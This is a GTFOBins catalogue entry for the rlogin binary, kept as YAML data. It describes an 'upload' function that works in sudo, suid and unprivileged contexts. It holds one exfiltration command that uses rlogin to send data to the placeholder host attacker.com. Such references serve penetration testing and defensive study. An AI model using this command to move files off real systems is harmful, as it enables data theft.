<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/rlogin -->
---
functions:
  upload:
  - binary: false
    code: |-
      rlogin -l DATA -p 12345 attacker.com
    comment: |-
      The file is corrupted by leading and trailing spurious data.
    contexts:
      sudo:
      suid:
      unprivileged:
...
